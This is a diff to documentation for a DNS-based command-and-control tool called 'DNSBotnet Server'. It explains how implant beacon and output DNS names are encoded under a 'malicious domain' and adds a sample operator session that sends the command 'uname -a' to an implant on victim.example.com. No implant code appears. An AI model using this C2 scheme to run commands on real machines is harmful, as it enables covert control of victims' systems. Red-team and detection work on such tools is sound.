@@ -75,16 +75,16 @@ Request and response names have the following parts
 |counter   | A unique number per request to prevent caching (i.e. cachebusting).                                                   | 37          |
 |t         | A literal t, to signify a beacon (request for tasking).                                                               | t           |
 |o         | A literal o, to signify an output request.                                                                            | o           |
-|implantid | An ID chosen by the implant to uniquely identify itself.  IP addresses with dots replaced by dashes are good choices. | 192-168-2-3 |
+|implantid | An ID chosen by the implant to uniquely identify itself.  IP addresses with dots replaced by dashes are good choices. | 192-168-11-11 |
 |domain    | The malicious domain.                                                                                                 | example.com |
 
 A beacon name might look like
 ```
-0.3580645942777501247.t.192-168-2-3.example.com
+0.3580645942777501247.t.192-168-11-11.example.com
 ```
 An output name might look like
 ```
-202020202020202020202020203634353220436f6e736f6c65202020202020.1150749505258401772.o.192-168-2-3.example.com
+202020202020202020202020203634353220436f6e736f6c65202020202020.1150749505258401772.o.192-168-11-11.example.com
 ```
 
 C2 Clients
@@ -96,7 +96,36 @@ issuing commands via SSH.  A complete list of commands is available with the
 The C2 client session can either be used to display tasking output or beacons
 (which may be filtered to only show certain beacons of interest).
 
-TODO: Example here
+Example C2 session:
+```
+Welcome to the DNSBotnet Server!
+
+Available commands:
+help        - This message
+id          - Show all beacons
+idr <regex> - Show beacons from implants matching regex
+id <ID>     - Show a particular implant's output (not beacons)
+t <ID>      - Task the current implant (after ID is set)
+last [n]    - Show the [n most recent] beacons from all implants
+exit        - Goodbye.
+
+2018/02/16 05:28:54 [192-168-11-11] Beacon (2143406018522754847)
+2018/02/16 05:28:56 [192-168-11-11] Beacon (2143406018522754848)
+2018/02/16 05:28:58 [192-168-11-11] Beacon (2143406018522754849)
+2018/02/16 05:29:01 [192-168-11-11] Beacon (2143406018522754850)
+> id 192-168-11-11
+2018/02/16 05:29:06 Watching implant with ID "192-168-11-11"
+192-168-11-11> t uname -a
+2018/02/16 05:29:12 Queued task for implant 192-168-11-11: "uname -a"
+OpenBSD victim.example.com 6.2 GENERIC.MP#134 amd64
+192-168-11-11> last 1
+ID            Queued Last Seen
+--            ------ ---------
+192-168-11-11 0      2018-02-16T05:29:31Z (4.8s)
+
+Current time is 2018-02-16T05:29:36Z
+192-168-11-11> exit
+```
 
 Unless a particular implant is specified with the `id` command, only beacons
 will be printed.  To interact with a particular implant, use the `id` command
